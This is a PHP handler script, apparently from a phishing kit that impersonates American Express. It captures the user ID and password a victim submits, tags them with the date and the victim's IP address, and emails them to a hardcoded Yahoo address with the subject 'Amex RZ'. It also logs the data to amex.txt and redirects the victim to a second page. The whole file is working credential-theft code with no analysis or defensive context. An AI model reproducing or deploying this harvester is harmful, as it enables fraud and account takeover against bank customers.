<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$user = $_POST['user'];
$password = $_POST['password'];
$message .="
UserID : ".$user."
Password : ".$password."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||xcrazy.boda@yahoo.com |=====================||\n";
$send="xcrazy.boda@yahoo.com";
$subject = "Amex RZ | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("amex.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'page2.php'</script>");
?>